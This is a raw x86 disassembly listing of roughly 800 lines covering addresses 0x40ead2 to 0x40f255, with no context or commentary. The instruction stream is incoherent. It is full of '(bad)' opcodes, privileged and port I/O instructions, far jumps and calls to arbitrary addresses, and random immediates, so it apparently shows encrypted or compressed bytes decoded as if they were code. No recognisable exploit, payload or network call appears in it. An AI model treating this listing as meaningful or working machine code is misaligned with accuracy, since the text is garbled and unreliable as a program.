  40ead2:	sbb    BYTE PTR [edi-0x58838353],dl
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40eaa4
  40eadc:	mov    bl,0x69
  40eade:	fwait
  40eadf:	pop    eax
  40eae0:	or     BYTE PTR [edi],al
  40eae2:	cs hlt 
  40eae4:	nop
  40eae5:	sub    dh,BYTE PTR [eax-0x7feb226c]
  40eaeb:	test   BYTE PTR ds:0xdf89a7ce,0xad
  40eaf2:	cmp    al,0x1d
  40eaf4:	out    0x6d,eax
  40eaf6:	inc    esp
  40eaf7:	lahf   
  40eaf8:	xlat   BYTE PTR ds:[ebx]
  40eaf9:	jle    0x40eb1c
  40eafb:	pop    esi
  40eafc:	sub    edi,ebp
  40eafe:	mov    edi,0x9f2c6fb1
  40eb03:	mov    eax,ds:0xc77e8a8c
  40eb08:	int3   
  40eb09:	jo     0x40eab5
  40eb0b:	and    esp,DWORD PTR [esi+0x6c5908b]
  40eb11:	fcom   DWORD PTR [edi-0xa3a1cfb]
  40eb17:	jmp    0xe7f6:0x41352ed0
  40eb1e:	(bad)  
  40eb1f:	test   al,0x23
  40eb21:	out    dx,al
  40eb22:	push   ss
  40eb23:	cdq    
  40eb24:	lea    eax,[ebp-0x11]
  40eb27:	(bad)  
  40eb28:	fidiv  WORD PTR [ebx+eax*8+0x6a]
  40eb2c:	data16 or al,0xab
  40eb2f:	aas    
  40eb30:	mov    ah,0x86
  40eb32:	cmp    BYTE PTR [edx+0x20bec8a6],dh
  40eb38:	(bad)  
  40eb39:	call   0xe6b51f94
  40eb3e:	sbb    BYTE PTR [edi],0xeb
  40eb41:	retf   
  40eb42:	popf   
  40eb43:	sbb    ecx,DWORD PTR [edx+ebx*2-0x780ec51d]
  40eb4a:	ins    DWORD PTR es:[edi],dx
  40eb4b:	pop    esp
  40eb4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb4d:	loopne 0x40eb93
  40eb4f:	aaa    
  40eb50:	ror    BYTE PTR [edi+0x5518e40d],0xb1
  40eb57:	mov    ebx,0xdc65caf0
  40eb5c:	pusha  
  40eb5d:	lds    ebx,FWORD PTR [ecx+edx*1-0x6c9dffa0]
  40eb64:	sub    bh,dh
  40eb66:	xor    DWORD PTR [eax],ecx
  40eb68:	cmc    
  40eb69:	or     esp,DWORD PTR [edx]
  40eb6b:	sbb    al,0xdd
  40eb6d:	aam    0x31
  40eb6f:	shl    DWORD PTR gs:[edx-0x5f],0x1f
  40eb74:	dec    esp
  40eb75:	mov    al,ds:0xc6d28ea
  40eb7a:	scas   al,BYTE PTR es:[edi]
  40eb7b:	lahf   
  40eb7c:	mov    esp,0xd7658159
  40eb81:	imul   ebp,DWORD PTR [edx],0x8be79258
  40eb87:	dec    esi
  40eb88:	jp     0x40ec00
  40eb8a:	xchg   edi,eax
  40eb8b:	adc    BYTE PTR [ebx+0x461ef9ec],dh
  40eb91:	mov    dl,0x35
  40eb93:	jmp    0x7d110740
  40eb98:	dec    edi
  40eb99:	jnp    0x40eb60
  40eb9b:	dec    ecx
  40eb9c:	mov    ebp,DWORD PTR [edi-0x124639bd]
  40eba2:	jbe    0x40ebf0
  40eba4:	dec    eax
  40eba5:	pop    ecx
  40eba6:	mov    bh,0xc7
  40eba8:	xor    eax,0xc37e9f8d
  40ebad:	and    al,0xef
  40ebaf:	mov    eax,ds:0x4a6173af
  40ebb4:	retf   
  40ebb5:	inc    edx
  40ebb6:	stos   BYTE PTR es:[edi],al
  40ebb7:	arpl   WORD PTR [edi+0x70],cx
  40ebba:	enter  0xfb71,0xbe
  40ebbe:	(bad)  
  40ebbf:	push   esi
  40ebc0:	push   cs
  40ebc1:	xor    al,0x84
  40ebc3:	sbb    DWORD PTR [esi+0x137a68d],ecx
  40ebc9:	xlat   BYTE PTR ds:[ebx]
  40ebca:	or     dl,BYTE PTR [edi]
  40ebcc:	push   ebp
  40ebcd:	out    0x2b,eax
  40ebcf:	rcl    ebx,0xfb
  40ebd2:	loope  0x40eb5c
  40ebd4:	xchg   ecx,eax
  40ebd5:	pop    esi
  40ebd6:	mov    edx,0xbf0f8ff0
  40ebdb:	pop    eax
  40ebdc:	aaa    
  40ebdd:	rcr    BYTE PTR [ebx-0x25999cb3],cl
  40ebe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe4:	push   edx
  40ebe5:	pushf  
  40ebe6:	jl     0x40ec37
  40ebe8:	sti    
  40ebe9:	adc    eax,0x97246e45
  40ebee:	mov    eax,0xcf1f3e9c
  40ebf3:	pop    edx
  40ebf4:	xchg   BYTE PTR [edx],cl
  40ebf6:	xchg   cl,ah
  40ebf8:	mov    BYTE PTR [ebx+0x6c1bbc6c],bl
  40ebfe:	mov    ch,0xc6
  40ec00:	xor    al,0xd2
  40ec02:	shr    DWORD PTR [ecx+0x5cc3adde],1
  40ec08:	sub    al,0xf9
  40ec0a:	jno    0x40ebe5
  40ec0c:	inc    ebx
  40ec0e:	and    DWORD PTR [edx-0x7e54fd79],ebx
  40ec14:	lock adc ebx,DWORD PTR [ebp+0x25dddbb7]
  40ec1b:	je     0x40ec12
  40ec1d:	ficom  DWORD PTR [ebx+esi*1]
  40ec20:	add    BYTE PTR ds:[edi-0x23],bh
  40ec24:	pop    ebp
  40ec25:	ins    DWORD PTR es:[edi],dx
  40ec26:	lods   al,BYTE PTR ds:[esi]
  40ec27:	pop    ebx
  40ec28:	sub    DWORD PTR [ebx+ecx*4],ebx
  40ec2b:	das    
  40ec2c:	cmp    BYTE PTR [ebp+0x21f16f8a],0xc2
  40ec33:	lock popa 
  40ec35:	ins    DWORD PTR es:[edi],dx
  40ec36:	xrelease xchg BYTE PTR [ebp+0x22],dl
  40ec3a:	jne    0x40ebe1
  40ec3c:	and    al,0xab
  40ec3e:	js     0x40ebe9
  40ec40:	sbb    al,0x75
  40ec42:	hlt    
  40ec43:	pop    DWORD PTR [ebp+0xeb18477]
  40ec49:	test   BYTE PTR [edx],cl
  40ec4b:	mov    eax,0x88fcebbd
  40ec50:	and    eax,0x50e9df37
  40ec55:	xor    DWORD PTR [ebp-0x38],esp
  40ec58:	mov    dl,0x3c
  40ec5a:	lock cdq 
  40ec5c:	aad    0x12
  40ec5e:	push   0x31bb0d0f
  40ec63:	push   ss
  40ec64:	sub    eax,0x108d9b6d
  40ec69:	mov    BYTE PTR [ebp+0x59],ch
  40ec6c:	js     0x40ec1a
  40ec6e:	jo     0x40ecca
  40ec70:	pop    eax
  40ec71:	fst    DWORD PTR [ecx-0x354c4c21]
  40ec77:	mov    ebp,0x27a69119
  40ec7c:	inc    ebx
  40ec7d:	lock mov edx,0x89f5d181
  40ec83:	inc    ebx
  40ec84:	or     ch,bl
  40ec86:	popa   
  40ec87:	loop   0x40ec62
  40ec89:	in     al,dx
  40ec8a:	popf   
  40ec8b:	(bad)  [edx-0x2c]
  40ec8e:	(bad)  
  40ec8f:	(bad)  
  40ec90:	das    
  40ec91:	scas   eax,DWORD PTR es:[edi]
  40ec92:	mov    ebp,0x141fb2bf
  40ec97:	push   ebp
  40ec98:	push   esp
  40ec99:	push   0xffffffc2
  40ec9b:	cld    
  40ec9c:	dec    esi
  40ec9d:	test   eax,0x16bd245e
  40eca2:	jmp    0x40ecc5
  40eca4:	sub    al,al
  40eca6:	loope  0x40ecf5
  40eca8:	aam    0xb2
  40ecaa:	test   al,0x11
  40ecac:	sbb    eax,0x207da430
  40ecb1:	jp     0x40ece9
  40ecb3:	sub    eax,0x5e40e985
  40ecb8:	hlt    
  40ecb9:	(bad)  
  40ecba:	into   
  40ecbb:	cmp    ch,cl
  40ecbd:	pop    ecx
  40ecbe:	imul   esi,DWORD PTR [edi-0x44],0xf36ecb08
  40ecc5:	scas   eax,DWORD PTR es:[edi]
  40ecc6:	xchg   ebx,eax
  40ecc8:	jecxz  0x40ecaf
  40ecca:	fsub   QWORD PTR [edx]
  40eccc:	pusha  
  40eccd:	adc    al,0x23
  40eccf:	mov    ah,0xdb
  40ecd1:	or     al,BYTE PTR [esi+ebx*8+0x335b94ea]
  40ecd8:	loope  0x40ed3a
  40ecda:	jae    0x40ed43
  40ecdc:	aad    0x5f
  40ecde:	out    dx,al
  40ecdf:	mov    eax,ds:0x7543b10
  40ece4:	jno    0x40ec95
  40ece6:	lock push es
  40ece8:	mov    edi,0xe215ee22
  40eced:	adc    dl,BYTE PTR [edi+0x41]
  40ecf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf1:	jmp    0x40ed17
  40ecf3:	repz shl DWORD PTR [esi],0xbf
  40ecf7:	bnd jg 0x40ecd0
  40ecfa:	hlt    
  40ecfb:	adc    eax,0x6b3edba4
  40ed00:	jae    0x40ed08
  40ed02:	pusha  
  40ed03:	popf   
  40ed04:	(bad)  [edi]
  40ed06:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40ed08:	push   ss
  40ed09:	pop    ecx
  40ed0a:	ins    BYTE PTR es:[edi],dx
  40ed0b:	inc    edi
  40ed0c:	jmp    0x40ecda
  40ed0e:	shl    BYTE PTR [ebx+0x3e23c05d],cl
  40ed14:	cmp    edx,ebp
  40ed16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed17:	(bad)  
  40ed18:	fimul  WORD PTR [ecx-0x7d]
  40ed1b:	retf   
  40ed1c:	jne    0x40ed81
  40ed1e:	push   ss
  40ed1f:	mov    ds,WORD PTR [si+0x2fca]
  40ed24:	sbb    al,0x3e
  40ed26:	lods   al,BYTE PTR ds:[esi]
  40ed27:	scas   al,BYTE PTR es:[edi]
  40ed28:	std    
  40ed29:	mov    ebp,0x6bb4ba77
  40ed2e:	pop    esi
  40ed2f:	jb     0x40eccb
  40ed31:	xchg   ebp,eax
  40ed32:	out    dx,eax
  40ed33:	sti    
  40ed34:	(bad)
  40ed38:	in     al,0x9a
  40ed3a:	out    0xc,al
  40ed3c:	add    ah,BYTE PTR [esi+0x3e61fa96]
  40ed42:	jmp    FWORD PTR [ecx]
  40ed44:	jecxz  0x40ecdd
  40ed46:	adc    dh,bl
  40ed48:	pushf  
  40ed49:	or     ebp,edi
  40ed4b:	call   0xa5a0:0x389cf1f
  40ed52:	shl    DWORD PTR [edx],0x8c
  40ed55:	dec    ecx
  40ed56:	sub    eax,0x306ce3b2
  40ed5b:	mov    al,ds:0xef24d11e
  40ed60:	and    BYTE PTR [edx],bh
  40ed62:	aad    0x62
  40ed64:	outs   dx,DWORD PTR ds:[esi]
  40ed65:	pushf  
  40ed66:	shl    cl,0xb1
  40ed69:	in     al,0xd
  40ed6b:	adc    eax,DWORD PTR [edi+0x72]
  40ed6e:	xchg   esi,eax
  40ed6f:	add    al,0xa9
  40ed71:	xchg   BYTE PTR [edx+edi*2-0x72c2a976],dl
  40ed78:	scas   al,BYTE PTR es:[edi]
  40ed79:	popa   
  40ed7a:	pop    eax
  40ed7b:	arpl   WORD PTR [bp+si],bx
  40ed7e:	cmp    eax,0xda3c0fa6
  40ed83:	sub    BYTE PTR [esp+esi*1-0x49],ch
  40ed87:	or     al,BYTE PTR [ecx+0x4b98a1ef]
  40ed8d:	das    
  40ed8e:	adc    BYTE PTR [ebx+0x69a02318],bl
  40ed94:	cld    
  40ed95:	dec    esi
  40ed96:	scas   eax,DWORD PTR es:[edi]
  40ed97:	pushf  
  40ed98:	dec    esp
  40ed99:	xchg   BYTE PTR [ecx+0x31c5f1b5],bl
  40ed9f:	iret   
  40eda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eda1:	pop    edx
  40eda2:	aam    0x6d
  40eda4:	imul   esp,DWORD PTR [ebx+ecx*2],0xffffffe4
  40eda8:	int    0x57
  40edaa:	test   BYTE PTR [ecx-0x47],0xae
  40edae:	sbb    al,0x80
  40edb0:	jecxz  0x40edd7
  40edb2:	cmp    BYTE PTR ds:0x4387bd1f,cl
  40edb8:	pop    ebx
  40edb9:	add    al,0x45
  40edbb:	loop   0x40eda9
  40edbd:	or     al,0x1c
  40edbf:	pushf  
  40edc0:	je     0x40eddf
  40edc2:	jo     0x40eda8
  40edc4:	mov    bl,0x23
  40edc6:	xor    al,0x1f
  40edc8:	hlt    
  40edc9:	xchg   esi,eax
  40edca:	mov    ds:0xac335674,eax
  40edcf:	jne    0x40edef
  40edd1:	add    eax,0xfc11ac8f
  40edd6:	pop    esi
  40edd7:	xor    BYTE PTR [edx+0x67],0xc8
  40eddb:	fwait
  40eddc:	jle    0x40edf7
  40edde:	pop    ds
  40eddf:	sub    eax,DWORD PTR [edi+0x6c]
  40ede2:	mov    ?,WORD PTR gs:[esi]
  40ede5:	jg     0x40edd7
  40ede7:	mov    cl,0xec
  40ede9:	cmp    cl,BYTE PTR [edi]
  40edeb:	and    cl,bh
  40eded:	push   ss
  40edee:	mov    bh,0x3a
  40edf0:	test   esp,0x1c2c3cca
  40edf6:	aaa    
  40edf7:	jo     0x40ee44
  40edf9:	add    bh,bl
  40edfb:	inc    ebx
  40edfc:	xchg   esp,eax
  40edfd:	pop    ss
  40edfe:	loop   0x40ee2e
  40ee00:	aam    0xf2
  40ee02:	stc    
  40ee03:	loope  0x40ee32
  40ee05:	mov    esi,0xb285da11
  40ee0a:	call   0xca5d:0x2ba57b30
  40ee11:	jecxz  0x40ee17
  40ee13:	pop    ebx
  40ee14:	cwde   
  40ee15:	js     0x40ee39
  40ee17:	adc    ebx,edi
  40ee19:	push   0x1
  40ee1b:	ss pop es
  40ee1d:	push   ecx
  40ee1e:	into   
  40ee1f:	stc    
  40ee20:	xchg   BYTE PTR [edi+0x79],bh
  40ee23:	rsm    
  40ee25:	icebp  
  40ee26:	idiv   esp
  40ee28:	and    esp,DWORD PTR [ecx]
  40ee2a:	out    0xe2,al
  40ee2c:	ss cmc 
  40ee2e:	nop
  40ee2f:	test   eax,0x4a008f17
  40ee34:	jns    0x40ee30
  40ee36:	add    al,0xc2
  40ee38:	ins    BYTE PTR es:[edi],dx
  40ee39:	xor    edi,edi
  40ee3b:	add    bh,BYTE PTR [ebp+0x64de3e06]
  40ee41:	stos   DWORD PTR es:[edi],eax
  40ee42:	lahf   
  40ee43:	sub    eax,DWORD PTR [ebp-0x31fee01f]
  40ee49:	sbb    esi,DWORD PTR [ecx+edi*4-0x6]
  40ee4d:	fsub   QWORD PTR [eax+0x3d3d93c1]
  40ee53:	mov    esi,0x6099bcfb
  40ee58:	jne    0x40eec0
  40ee5a:	mov    ah,0x1e
  40ee5c:	(bad)  
  40ee5d:	sbb    BYTE PTR [ebx-0x3c],al
  40ee60:	inc    edx
  40ee61:	fist   WORD PTR fs:[eax+eiz*2]
  40ee65:	scas   eax,DWORD PTR es:[edi]
  40ee66:	test   BYTE PTR [edi-0x34500dbd],al
  40ee6c:	test   BYTE PTR [esi],ah
  40ee6e:	outs   dx,DWORD PTR ds:[esi]
  40ee6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee70:	jl     0x40ee9b
  40ee72:	mov    ebp,0x9fdc6f2b
  40ee77:	addr16 inc ebp
  40ee79:	daa    
  40ee7a:	out    0x64,eax
  40ee7c:	inc    ecx
  40ee7d:	sbb    esp,esi
  40ee7f:	push   es
  40ee80:	mov    ebx,0xa3a28cdd
  40ee85:	call   0xfc45:0x8b00413b
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	fnstsw WORD PTR [ecx+0x5f]
  40eea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeaa:	ds test eax,0x79a77c7c
  40eeb0:	jl     0x40ef2e
  40eeb2:	out    0x3a,al
  40eeb4:	div    BYTE PTR [ebx+esi*4+0x3b]
  40eeb8:	mov    ss,WORD PTR [edi+0x2f]
  40eebb:	sahf   
  40eebc:	or     eax,0xd813d66b
  40eec1:	mov    edi,edi
  40eec3:	aaa    
  40eec4:	cwde   
  40eec5:	jl     0x40ee94
  40eec7:	and    ecx,DWORD PTR [edi+0x5760b85c]
  40eecd:	jmp    0xeebccb2
  40eed2:	xlat   BYTE PTR ds:[ebx]
  40eed3:	xchg   edx,eax
  40eed4:	adc    BYTE PTR ds:0xf19ff934,0x7d
  40eedb:	mov    ah,0xc7
  40eedd:	push   ebp
  40eede:	popf   
  40eedf:	je     0x40eecd
  40eee1:	enter  0x8c39,0x87
  40eee5:	retfw  
  40eee7:	(bad)  
  40eee8:	pop    ecx
  40eee9:	xor    al,0x75
  40eeeb:	cwde   
  40eeec:	sbb    al,0xb2
  40eeee:	jg     0x40eedd
  40eef0:	pop    es
  40eef1:	pop    ss
  40eef2:	mov    ah,bl
  40eef4:	jo     0x40ef5e
  40eef6:	xchg   esi,eax
  40eef7:	fstp   QWORD PTR [ecx-0x1]
  40eefa:	ds loop 0x40ef77
  40eefd:	call   0x6a26a1ed
  40ef02:	addr16 pop ebp
  40ef04:	dec    esp
  40ef05:	mov    edi,ds
  40ef07:	pop    ebp
  40ef08:	mov    cl,0xf8
  40ef0a:	dec    esi
  40ef0b:	and    DWORD PTR [edi+0x36],0xffffff84
  40ef0f:	ja     0x40ef16
  40ef11:	out    dx,al
  40ef12:	mov    ds:0xa9c2c8e2,eax
  40ef17:	jns    0x40ef8e
  40ef19:	fs daa 
  40ef1b:	push   eax
  40ef1c:	mov    bl,BYTE PTR [ebp+0xb]
  40ef1f:	pop    ds
  40ef20:	jp     0x40ef29
  40ef22:	popa   
  40ef23:	(bad)  [ecx]
  40ef25:	or     eax,0x261024da
  40ef2a:	xor    al,0x97
  40ef2c:	aaa    
  40ef2d:	push   ecx
  40ef2e:	or     DWORD PTR [esi],0xeb43533c
  40ef34:	xchg   edi,eax
  40ef35:	mov    al,ds:0xd099c218
  40ef3a:	inc    edi
  40ef3b:	call   0x6ab34e98
  40ef40:	sbb    eax,0x5369ec1a
  40ef45:	and    eax,0x5200397f
  40ef4a:	loopne 0x40ef12
  40ef4c:	xchg   ebx,eax
  40ef4d:	loopne 0x40ef39
  40ef4f:	inc    esi
  40ef50:	push   0x460c28f2
  40ef55:	aaa    
  40ef56:	xor    al,0x67
  40ef58:	mov    eax,ds:0xa267bd8f
  40ef5d:	sub    eax,0xda45ad3b
  40ef62:	fbld   TBYTE PTR [ebx-0x29c6be50]
  40ef68:	sub    al,0xf1
  40ef6a:	add    BYTE PTR [eax+0x58],bl
  40ef6d:	sub    BYTE PTR [edi-0x5e],dl
  40ef70:	lods   al,BYTE PTR ds:[esi]
  40ef71:	mov    eax,DWORD PTR [eax+0x6a322857]
  40ef77:	sbb    esp,DWORD PTR [ebx]
  40ef79:	sub    cl,cl
  40ef7b:	in     ax,dx
  40ef7d:	mov    al,ds:0x7797452f
  40ef82:	inc    esp
  40ef83:	or     ebx,ecx
  40ef85:	pop    ebp
  40ef86:	neg    BYTE PTR [edi+0x82bff2b]
  40ef8c:	(bad)  
  40ef8d:	arpl   bx,ax
  40ef8f:	xchg   ebp,eax
  40ef90:	push   edi
  40ef91:	ficomp WORD PTR ds:0xc37ad1f1
  40ef97:	ins    BYTE PTR es:[edi],dx
  40ef98:	inc    ebx
  40ef99:	(bad)  
  40ef9a:	shl    cl,cl
  40ef9c:	add    BYTE PTR [eax-0x13a707c9],al
  40efa2:	call   0xc030a85c
  40efa7:	lea    esp,[edi]
  40efa9:	mov    cl,0x16
  40efab:	add    cl,BYTE PTR [eax-0x27ca23c]
  40efb1:	inc    eax
  40efb2:	jbe    0x40efbf
  40efb4:	add    eax,0x43bd8542
  40efb9:	fidivr DWORD PTR [ecx]
  40efbb:	dec    eax
  40efbc:	mov    esi,0xc0feb4bc
  40efc1:	mov    ds:0xc021189f,al
  40efc6:	adc    eax,0xdbf2c375
  40efcb:	rol    BYTE PTR [ebp+0x5c028e5b],1
  40efd1:	cmp    al,0xdb
  40efd3:	daa    
  40efd4:	dec    ebx
  40efd5:	xchg   edi,eax
  40efd6:	dec    ecx
  40efd7:	sub    BYTE PTR [ecx],0x35
  40efda:	out    0x81,eax
  40efdc:	in     al,0x9d
  40efde:	fist   DWORD PTR [esi+0x55]
  40efe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efe2:	(bad)  
  40efe4:	dec    ebx
  40efe5:	mov    al,0x64
  40efe7:	fidivr WORD PTR [edx-0x288183ca]
  40efed:	mov    bh,0xc9
  40efef:	xchg   esp,eax
  40eff0:	push   ebp
  40eff1:	mov    edx,0x835c4494
  40eff6:	sbb    BYTE PTR [ecx-0x60],dh
  40eff9:	das    
  40effa:	push   ss
  40effb:	cs out 0x4d,eax
  40effe:	test   BYTE PTR [ecx+0x41],dl
  40f001:	xor    ecx,DWORD PTR [ecx]
  40f003:	cmp    esi,ecx
  40f005:	inc    ebp
  40f006:	pop    ebx
  40f007:	cmp    eax,0x4f21b422
  40f00c:	loope  0x40f044
  40f00e:	push   ebx
  40f00f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f010:	mov    al,ds:0x6bba6e0e
  40f015:	mov    ds:0x121b701f,eax
  40f01a:	inc    ebx
  40f01b:	loopne 0x40f089
  40f01d:	fldenv [ecx+ebp*8-0x6]
  40f021:	cmp    al,0x8d
  40f023:	mov    ebx,0x53e19f9b
  40f028:	sub    bl,dh
  40f02a:	fst    DWORD PTR ds:0x5f79921c
  40f030:	push   0x7c7d0548
  40f035:	jno    0x40f09c
  40f037:	mov    edx,0xde79d8cf
  40f03c:	sbb    al,0xa5
  40f03e:	retf   0x9af0
  40f041:	sbb    DWORD PTR [ecx-0x4095b0e],0xd3ee1be7
  40f04b:	je     0x40f066
  40f04d:	sub    al,BYTE PTR [ebx-0x41]
  40f050:	imul   bh
  40f052:	cmp    al,0x4a
  40f054:	in     eax,0x92
  40f056:	cwde   
  40f057:	test   BYTE PTR [ebx-0x9e007ed],0xd2
  40f05e:	sar    BYTE PTR [ebx-0x19b33509],1
  40f064:	popa   
  40f065:	push   edi
  40f066:	es das 
  40f068:	push   0xbb2d7ce2
  40f06d:	pop    ebx
  40f06e:	dec    edx
  40f06f:	sahf   
  40f070:	ins    BYTE PTR es:[edi],dx
  40f071:	call   0xa6f6:0xf31f42a5
  40f078:	cmp    edx,DWORD PTR [esi]
  40f07a:	xor    BYTE PTR [esi+esi*4-0x412c4ee9],ch
  40f081:	iret   
  40f082:	ret    0xf7f8
  40f085:	popa   
  40f086:	retf   0xe968
  40f089:	xchg   esi,eax
  40f08a:	mov    bh,0x80
  40f08c:	sbb    al,0x4e
  40f08e:	jle    0x40f014
  40f090:	imul   ecx,DWORD PTR [eax],0x5f
  40f093:	cs mov ?,ebx
  40f096:	cmp    dh,BYTE PTR [esi-0x249ad5f2]
  40f09c:	add    BYTE PTR [ecx+0x7b1bdd54],bh
  40f0a2:	lock aaa 
  40f0a4:	push   ss
  40f0a5:	mov    ch,dl
  40f0a7:	inc    edi
  40f0a8:	fbld   TBYTE PTR [ebp+0x5842879]
  40f0ae:	mov    bh,0x1b
  40f0b0:	pop    esp
  40f0b1:	or     eax,0x49e9d2e0
  40f0b6:	clc    
  40f0b7:	or     al,0xe3
  40f0b9:	dec    edi
  40f0ba:	add    al,0x66
  40f0bc:	imul   edx
  40f0be:	adc    eax,0x329748f1
  40f0c3:	pop    edx
  40f0c4:	js     0x40f0c6
  40f0c6:	mov    edx,0x7c7b1994
  40f0cb:	add    DWORD PTR ds:0xe60773a7,ebx
  40f0d1:	xchg   esp,eax
  40f0d2:	test   al,0x76
  40f0d4:	mov    bl,0x5f
  40f0d6:	pop    ds
  40f0d7:	pop    ebp
  40f0d8:	icebp  
  40f0d9:	leave  
  40f0da:	ret    
  40f0db:	mov    esp,DWORD PTR [ebx-0x69]
  40f0de:	add    bl,dh
  40f0e0:	jmp    0x6943:0x758a90d0
  40f0e7:	push   edx
  40f0e8:	es mov al,0x7
  40f0eb:	jae    0x40f08f
  40f0ed:	cmp    eax,0xcc66e64e
  40f0f2:	sti    
  40f0f3:	inc    eax
  40f0f4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f6:	sub    eax,0xb68148a3
  40f0fb:	jnp    0x40f13b
  40f0fd:	lods   eax,DWORD PTR ds:[esi]
  40f0fe:	popf   
  40f0ff:	int    0x2e
  40f101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f102:	mov    esp,0x51c032ec
  40f107:	sbb    DWORD PTR [edx+ebp*8-0x74d6bcef],esp
  40f10e:	xchg   esp,eax
  40f10f:	sbb    BYTE PTR [edi+0x75af3249],bl
  40f115:	dec    ecx
  40f116:	mov    ds,WORD PTR [ecx]
  40f118:	out    dx,al
  40f119:	mov    al,ds:0x196cf7
  40f11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f11f:	jmp    0x40f0ef
  40f121:	out    dx,al
  40f122:	js     0x40f157
  40f124:	int    0xd3
  40f126:	jmp    0x40f179
  40f128:	stos   DWORD PTR es:[edi],eax
  40f129:	(bad)  
  40f12a:	mov    ah,0x76
  40f12c:	or     edi,DWORD PTR [ecx]
  40f12e:	xchg   ecx,eax
  40f12f:	pop    ebp
  40f130:	loope  0x40f0e8
  40f132:	push   esi
  40f133:	cmp    eax,0x124fa850
  40f138:	in     al,0x71
  40f13a:	cdq    
  40f13b:	push   edx
  40f13c:	icebp  
  40f13d:	cmp    BYTE PTR [ebp+0x46db1743],cl
  40f143:	aas    
  40f144:	jmp    0x7c2b188e
  40f149:	mov    eax,DWORD PTR [edi-0x72]
  40f14c:	(bad)  
  40f14d:	(bad)  
  40f14e:	aaa    
  40f14f:	scas   eax,DWORD PTR es:[edi]
  40f150:	mov    eax,0x5bf7637b
  40f155:	mov    esi,0x2233fdf
  40f15a:	fnstcw WORD PTR [edx+0x27]
  40f15d:	inc    esp
  40f15e:	fdiv   DWORD PTR [edx+0x1f]
  40f161:	push   esp
  40f162:	jge    0x40f15b
  40f164:	jge    0x40f1da
  40f166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f167:	xor    bl,bh
  40f169:	adc    edi,DWORD PTR [ebx]
  40f16b:	lea    edx,[ebx]
  40f16d:	retf   0xd43c
  40f170:	clc    
  40f171:	rcr    DWORD PTR [edi-0x1a],1
  40f174:	rol    esp,1
  40f176:	js     0x40f16c
  40f178:	or     al,0x95
  40f17a:	sub    DWORD PTR [edx-0xa4faa27],esi
  40f180:	cs pop es
  40f182:	test   DWORD PTR [ebx-0x4c46815a],ecx
  40f188:	(bad)  
  40f189:	(bad)  [esi+0x25]
  40f18c:	mov    ds:0x9aa7ab03,al
  40f191:	aaa    
  40f192:	dec    ebx
  40f193:	loop   0x40f1ac
  40f195:	mov    ebx,0x491424b9
  40f19a:	out    dx,al
  40f19b:	jns    0x40f1db
  40f19d:	mov    ecx,?
  40f19f:	iret   
  40f1a0:	(bad)  
  40f1a1:	call   0x645728b
  40f1a6:	dec    esp
  40f1a7:	lock fldenv [ecx+ebp*2+0x5212503a]
  40f1af:	cmp    esi,DWORD PTR ds:0x97ecc587
  40f1b5:	mov    eax,0x4c559a6e
  40f1ba:	(bad)
  40f1bd:	ror    BYTE PTR [edx+0x51],1
  40f1c0:	repz adc eax,0xcb6b816e
  40f1c6:	add    DWORD PTR ds:0xce3ccdb,ebx
  40f1cc:	sub    bh,BYTE PTR [edi+eax*4]
  40f1cf:	lods   al,BYTE PTR ds:[esi]
  40f1d0:	cmp    DWORD PTR [eax+0x6fe44903],ecx
  40f1d6:	ror    BYTE PTR [esi],cl
  40f1d8:	nop
  40f1d9:	lods   eax,DWORD PTR ds:[esi]
  40f1da:	in     eax,dx
  40f1db:	enter  0xdd78,0xc9
  40f1df:	dec    esp
  40f1e0:	nop
  40f1e1:	das    
  40f1e2:	ss scas eax,DWORD PTR es:[edi]
  40f1e4:	xchg   ebx,eax
  40f1e5:	pop    ebp
  40f1e6:	jne    0x40f174
  40f1e8:	sbb    BYTE PTR [ebx-0x2c758280],0xa6
  40f1ef:	stc    
  40f1f0:	jb     0x40f1f7
  40f1f2:	jno    0x40f22b
  40f1f4:	push   0xc8e0bde6
  40f1f9:	push   edi
  40f1fa:	dec    ebx
  40f1fb:	cli    
  40f1fc:	je     0x40f189
  40f1fe:	daa    
  40f1ff:	cmp    dh,BYTE PTR [ecx+0x6]
  40f202:	hlt    
  40f203:	jmp    0x40f1ea
  40f205:	mov    cl,0x6d
  40f207:	add    eax,DWORD PTR [esi]
  40f209:	xor    DWORD PTR [esi+ebx*1-0x4c],edi
  40f20d:	test   ah,ch
  40f20f:	hlt    
  40f210:	cli    
  40f211:	lea    ecx,[ebx+esi*2]
  40f214:	lea    edx,[ebx+edi*8-0x4b5a0270]
  40f21b:	ficom  WORD PTR [eax+0x31]
  40f21e:	add    al,0xdc
  40f220:	outs   dx,DWORD PTR ds:[esi]
  40f221:	jae    0x40f1c8
  40f223:	sub    BYTE PTR [eax],dh
  40f225:	(bad)  
  40f226:	and    BYTE PTR [edx+esi*8+0x6d1be861],dh
  40f22d:	ss inc esi
  40f22f:	mov    bh,0x4e
  40f231:	inc    esp
  40f232:	out    dx,eax
  40f233:	shr    DWORD PTR [ebp+0x57f3d744],1
  40f239:	dec    ebp
  40f23a:	jmp    0x40f2ac
  40f23c:	cmp    al,0x21
  40f23e:	jge    0x40f2ae
  40f240:	add    al,0xe5
  40f242:	test   al,0x86
  40f244:	mov    esp,esi
  40f246:	stc    
  40f247:	dec    ebp
  40f248:	imul   ecx,esp,0xa74e6e39
  40f24e:	mov    es,esi
  40f250:	sti    
  40f251:	inc    esi
  40f252:	xor    dh,dl
  40f254:	push   edx
  40f255:	push   ecx
